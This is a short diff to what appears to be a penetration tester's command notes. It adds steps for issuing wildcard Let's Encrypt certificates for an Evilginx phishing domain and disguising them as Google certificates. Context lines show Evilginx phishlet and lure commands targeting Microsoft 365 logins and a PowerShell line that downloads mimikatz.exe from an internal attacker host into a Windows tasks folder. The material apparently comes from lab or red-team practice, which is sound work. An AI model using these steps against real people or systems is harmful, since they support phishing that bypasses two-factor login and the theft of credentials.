@@ -491,6 +491,15 @@ phishlets enable m365
 lures create m365
 lures get-url 0
 ```
+```
+# evilginx self-make let's encrypt certs
+# https://cilynx.com/how-to/evilginx2-vs-2fa-phishing/424/
+certbot certonly -d "<DOMAIN>" -d "*.<DOMAIN>" -a manual --preferred-challenges dns --register-unsafely-without-email
+mkdir /root/.evilginx/crt/<DOMAIN>
+cp /etc/letsencrypt/live/<DOMAIN>/* /root/.evilginx/crt/<DOMAIN>/
+cp /root/.evilginx/crt/<DOMAIN>/cert.pem /root/.evilginx/crt/<DOMAIN>/google.crt
+cp /root/.evilginx/crt/<DOMAIN>/privkey.pem /root/.evilginx/crt/<DOMAIN>/google.key
+```
 extra sids - krbtgt way (ref lab 16)
 ```
 iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
